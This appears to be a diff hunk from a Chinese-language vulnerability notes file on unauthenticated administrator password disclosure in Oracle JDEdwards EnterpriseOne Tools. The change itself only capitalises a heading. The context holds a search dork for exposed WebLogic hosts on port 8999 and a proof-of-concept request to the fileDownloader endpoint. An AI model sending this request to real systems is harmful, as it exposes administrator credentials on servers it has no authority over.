@@ -8,7 +8,7 @@ Oracle JDEdwards EnterpriseOne Tools未授权获取管理员密码泄漏
 port:8999 product:"Oracle WebLogic Server"
 ```
 
-## poc
+## POC
 
 ```java
 http://ip:8999/manage/fileDownloader?sec=1
